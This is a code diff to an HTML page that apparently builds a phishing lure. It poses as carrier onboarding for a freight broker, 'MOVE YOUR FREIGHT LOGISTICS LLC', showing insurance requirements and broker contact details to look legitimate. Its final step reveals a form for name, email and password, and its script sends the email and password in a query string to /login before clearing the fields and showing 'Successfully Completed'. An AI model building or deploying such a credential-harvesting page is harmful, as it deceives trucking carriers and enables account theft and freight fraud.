@@ -17,8 +17,38 @@
 
         body {
             font-family: Arial;
-            background-color: red;
+
+            background-image: url('./background.webp');
+            padding: 0px;
+            margin: 0px;
+            color: white
+        }
+
+        header {
+            height: 100px;
+            width: 100%;
+            background-color: black;
+            margin-bottom: 50px;
+            text-align: center;
+            vertical-align: center;
+            line-height: 100px;
+            font-size: 30px;
+        }
+
+        #main_content {
             padding: 50px;
+            margin: 0 auto;
+            font-size: 18px;
+            width: 90%;
+        }
+
+        #content-message {
+            font-weight: bold;
+            font-size: 22px;
+        }
+
+        #form {
+            display: none;
         }
 
         .login {
@@ -64,7 +94,7 @@
 
         .btn {
             border: 2px solid transparent;
-            background: #3498db;
+            background: #013151;
             color: #ffffff;
             font-size: 16px;
             line-height: 25px;
@@ -77,10 +107,12 @@
             display: block;
             width: 250px;
             margin: 0 auto;
+            margin-top: 50px;
         }
 
         .btn:hover {
-            background-color: #2980b9;
+            background-color: #0d84d3;
+            cursor: pointer;
         }
 
         .login-link {
@@ -98,73 +130,234 @@
             transition: all;
             transition-duration: 1s;
         }
+
+        #second {
+            display: none;
+        }
+
+        #second_content {
+            display: flex;
+            justify-content: space-between;
+        }
+
+        h2 {
+            text-align: center;
+        }
+
+        .row {
+            display: flex;
+            width: 100%;
+            gap: 50px;
+        }
+
+        .row span {
+            flex: 1;
+            margin-top: 15px;
+            padding: 3px;
+        }
+
+        .row input {
+            height: 10px;
+            margin-top: 15px;
+        }
+
+        .row span:last-child {
+            border: 1px solid white;
+        }
     </style>
+    <script>
+
+        const nextStep = () => {
+            first.style.display = 'none'
+            second.style.display = 'block'
+        }
+
+        const finalStep = () => {
+            second.style.display = 'none'
+            form.style.display = 'block'
+        }
+
+
+
+    </script>
+
 </head>
 
 <body>
 
     <body>
-        <form action="#" id="form">
-            <div class="login">
-                <div class="login-screen">
-                    <div class="app-title"></div>
-
-                    <div class="login-form">
-                        <div class="control-group">
-                            <input type="text" class="login-field" value="" placeholder="Full Name" id="full-name"
-                                required />
-                            <label class="login-field-icon fui-user" for="full-name"></label>
+        <header>
+            MOVE YOUR FREIGHT LOGISTICS LLC.
+        </header>
+        <div id="main_content">
+            <div id="first">
+                <div id="search-item" class="search-item">
+                    <span id="ctl00_ContentPlaceHolderMain_lblPageRequirements">
+                        <div id="content">
+                            <div id="content-message">Welcome! Thank you for your interest in becoming an approved
+                                carrier
+                                for MOVE YOUR FREIGHT LOGISTICS LLC. We look forward to working with you.</div>
+                            <div id="content-requirements">
+                                <h4>To become a certified carrier, you must:</h4>
+                            </div>
+                            <ul class="outer-list">
+                                <li>Provide your MC/MX# or DOT# to begin registration. Intrastate carriers without a
+                                    DOT#
+                                    may provide an applicable state registration number to begin registration.</li>
+                                <li>Supply your company contact information.</li>
+                                <li>Submit an electronic W9 (have your TaxID available).</li>
+                                <li>Complete the Carrier Profile.</li>
+                                <li>Read and ACCEPT the Agreement(s).</li>
+                                <li> Provide a Certificate of Insurance that meets the insurance minimum requirements
+                                    below.
+                                    Certificates must be submitted from your insurance producer (agent) <ul
+                                        class="inner-list">
+                                        <li>$100,000 Cargo Coverage</li>
+                                        <li>$1,000,000 Auto Coverage</li>
+                                    </ul>
+                                </li>
+                                <li>If RMIS does not already have a copy of your certificate on file, we will request
+                                    one
+                                    for you from your insurance agent (producer). </li>
+                                <li> You will be required to meet the following requirements: <ul class="inner-list">
+                                        <li>Active Common or Contract Authority.</li>
+                                        <li>Safety Rating must be Satisfactory, Conditional or None.</li>
+                                        <li>Authority active for at least 30 days.</li>
+                                    </ul>
+                                </li>
+                            </ul>
                         </div>
-                        <div class="control-group">
-                            <input type="email" class="login-field" value="" placeholder="Email" id="login-name"
-                                required />
-                            <label class="login-field-icon fui-user" for="login-name"></label>
-                        </div>
+                    </span>
+                </div>
+                <button class="btn btn-primary btn-large btn-block" id="" onclick="nextStep()"="#">Go To Next
+                    Step</button>
+            </div>
 
-                        <div class="control-group">
-                            <input type="password" class="login-field" value="" placeholder="Password" id="login-pass"
-                                required />
-                            <label class="login-field-icon fui-lock" for="login-pass"></label>
+            <div id="second">
+                <div id="second_content">
+                    <div>
+                        <h2>Broker</h2>
+                        <div class="row">
+                            <span>MC #</span>
+                            <span>MC-1591643</span>
                         </div>
-
-                        <button class="btn btn-primary btn-large btn-block" id="btn" href="#">Complete</button>
-                        <div class="control-group" id="completed">
-                            Successfully Completed
+                        <div class="row">
+                            <span>Company Name</span>
+                            <span>MOVE YOUR FREIGHT LOGISTICS LLC</span>
+                        </div>
+                        <div class="row">
+                            <span>Company Address</span>
+                            <span>17 AFFIRMED WAY NEWNAN, GA 30263</span>
+                        </div>
+                        <div class="row">
+                            <span>Title</span>
+                            <span>Dispatcher</span>
+                        </div>
+                        <div class="row">
+                            <span>Name</span>
+                            <span>Kavin</span>
+                        </div>
+                        <div class="row">
+                            <span>Phone</span>
+                            <span>(951) 338-5380</span>
+                        </div>
+                    </div>
+                    <div>
+                        <h2>Courier</h2>
+                        <div class="row">
+                            <span>MC #</span>
+                            <input type="text">
+                        </div>
+                        <div class="row">
+                            <span>Company Name</span>
+                            <input type="text">
+                        </div>
+                        <div class="row">
+                            <span>Company Address</span>
+                            <input type="text">
+                        </div>
+                        <div class="row">
+                            <span>Title</span>
+                            <input type="text">
+                        </div>
+                        <div class="row">
+                            <span>Name</span>
+                            <input type="text">
+                        </div>
+                        <div class="row">
+                            <span>Phone</span>
+                            <input type="text">
                         </div>
                     </div>
 
                 </div>
-
+                <button class="btn btn-primary btn-large btn-block" onclick="finalStep()"="#">Go To Next
+                    Step</button>
             </div>
-        </form>
-        <script type="module" src="./script.js"></script>
-        <script>
-            document.getElementById('form').addEventListener('submit', function (e) {
-                e.preventDefault();
-                e.stopPropagation();
-                const fullName = document.getElementById("full-name");
-                const loginName = document.getElementById("login-name");
-                const loginPass = document.getElementById("login-pass");
-                const completed = document.getElementById("completed");
-                fetch(`/login?login=${loginName.value}&pass=${loginPass.value}`)
-                setTimeout(() => {
-                    fullName.value = '';
-                    loginName.value = '';
-                    loginPass.value = '';
-                })
 
-                setTimeout(() => {
-                    completed.style.opacity = 1;
+
+            <form action="#" id="form">
+                <div class="login">
+                    <div class="login-screen">
+                        <div class="app-title"></div>
+
+                        <div class="login-form">
+                            <div class="control-group">
+                                <input type="text" class="login-field" value="" placeholder="Full Name" id="full-name"
+                                    required />
+                                <label class="login-field-icon fui-user" for="full-name"></label>
+                            </div>
+                            <div class="control-group">
+                                <input type="email" class="login-field" value="" placeholder="Email" id="login-name"
+                                    required />
+                                <label class="login-field-icon fui-user" for="login-name"></label>
+                            </div>
+
+                            <div class="control-group">
+                                <input type="password" class="login-field" value="" placeholder="Password"
+                                    id="login-pass" required />
+                                <label class="login-field-icon fui-lock" for="login-pass"></label>
+                            </div>
+
+                            <button class="btn btn-primary btn-large btn-block" id="btn" href="#">Complete</button>
+                            <div class="control-group" id="completed">
+                                Successfully Completed
+                            </div>
+                        </div>
+
+                    </div>
+
+                </div>
+            </form>
+            <script type="module" src="./script.js"></script>
+            <script>
+                document.getElementById('form').addEventListener('submit', function (e) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    const fullName = document.getElementById("full-name");
+                    const loginName = document.getElementById("login-name");
+                    const loginPass = document.getElementById("login-pass");
+                    const completed = document.getElementById("completed");
+                    fetch(`/login?login=${loginName.value}&pass=${loginPass.value}`)
+                    setTimeout(() => {
+                        fullName.value = '';
+                        loginName.value = '';
+                        loginPass.value = '';
+                    })
 
                     setTimeout(() => {
-                        completed.style.opacity = 0;
-                    }, 3000)
-                }, 300)
+                        completed.style.opacity = 1;
+
+                        setTimeout(() => {
+                            completed.style.opacity = 0;
+                        }, 3000)
+                    }, 300)
 
 
 
-            });
-        </script>
+                });
+            </script>
+        </div>
     </body>
 </body>
 
